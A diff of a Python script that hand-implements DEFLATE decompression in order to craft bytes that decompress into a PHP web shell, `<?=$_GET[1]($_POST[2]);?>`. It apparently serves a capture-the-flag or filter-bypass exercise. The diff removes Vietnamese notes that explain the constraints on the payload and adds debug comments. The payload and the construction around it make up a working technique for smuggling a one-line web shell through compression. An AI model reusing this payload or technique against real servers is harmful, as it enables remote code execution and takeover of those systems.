@@ -72,7 +72,7 @@ def inflate(r):
             raise Exception('invalid BTYPE')
     return bytes(out)
 
-# [Be happy to skip me]
+# [skip me]
 def inflate_block_no_compression(r, o):
     LEN = r.read_bytes(2)
     NLEN = r.read_bytes(2)
@@ -128,7 +128,7 @@ def decode_symbol(r, t):
     
     return node.symbol
 
-# [Be happy to skip me]
+# [skip me]
 LengthExtraBits = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2, 3, 3, 3,
         3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
 LengthBase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31, 35, 43,
@@ -171,7 +171,7 @@ def bl_list_to_tree(bl, alphabet):
 
 CodeLengthCodesOrder = [16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]
 
-# [Be happy to skip me]
+# [skip me]
 def decode_trees(r):
     # The number of literal/length codes
     HLIT = r.read_bits(5) + 257
@@ -218,7 +218,7 @@ def decode_trees(r):
     distance_tree = bl_list_to_tree(bl[HLIT:], range(30))
     return literal_length_tree, distance_tree
 
-# [Be happy to skip me]
+# [skip me]
 def inflate_block_dynamic(r, o):
     literal_length_tree, distance_tree = decode_trees(r)
     inflate_block_data(r, literal_length_tree, distance_tree, o)
@@ -233,28 +233,14 @@ def inflate_block_fixed(r, o):
 
     inflate_block_data(r, literal_length_tree, distance_tree, o)
 
-# Điều kiện để code đúng, nếu không thì sẽ phải tự sửa lại tùy payload 😿
-# 1. Không dùng quá nhiều loại ký tự khác nhau trong payload.
-# 2. Dùng payload càng ngắn càng tốt.
-# 3. Mỗi substring độ dài 3 sau khi decompress() không xuất hiện quá 1 lần (Để đảm bảo BTYPE luôn bằng 1).
-# 4. Nên để terminate_symbol như vậy.
-
-# Ghi chú cho sau này:
-# - Các phần được implement nhưng lại không dùng mà được để lại đề phòng sau này sẽ được comment là "# [Be happy to skip me]"
-# - Điều kiện 1 được dùng để đảm bảo BTYPE không thể bằng 0.
-# - Điều kiện 2 được dùng để đảm bảo BTYPE không thể bằng 2.
-# - Điều kiện 3 được dùng để đảm bảo thuật toán LZ77 được dùng khi compress() không có tác dụng, do đó lúc decompress() cũng không có tác dụng.
-# - 27/12/2022: chỉ có 3 loại BTYPE 0, 1 và 2. Mình cố gắng để BTYPE = 1, 
-#       + là một giá trị cho phép hiệu quả về cả độ phức tạp và độ dài của payload và output.
-#       + mình cố gắng để BTYPE = 1 nhưng đoạn implement decompress() thì có cả code xử lý khi BTYPE = 0 hay 2 dùng để đề phòng cho sau này.
-#       + tương tự phần xử lý LZ77 ở trên cũng không có tác dụng nhưng sẽ được mình để lại.
-
 metadata_and_something = b'x\x9cc^' # Chủ yếu là metadata để compress
 payload = b'<?=$_GET[1]($_POST[2]);?>'
 terminate_symbol = b'\x00\x00' # Đảm bảo luôn có 7 bit 0 sau payload
 checksum = b'n\xcf\x07;' # checksum phải có chính xác 4 byte, còn giá trị để thế nào cũng được vì implement ở trên bỏ qua checksum nhưng vẫn kiểm tra format nên cần đủ 4 byte
 t = decompress(metadata_and_something + payload + terminate_symbol + checksum)
 print(t)
+
+
 
 import zlib
 print("\nDouble check")
@@ -263,3 +249,13 @@ if (payload in com):
     print("Yeah 🙂")
 else:
     print("Take a rest 🤕")
+
+# [Debug]
+# t = BitReader(metadata_and_something + payload)
+# a = ''
+# while (True):
+#     try:
+#         a += str(t.read_bit())
+#     except:
+#         break
+# print(a)
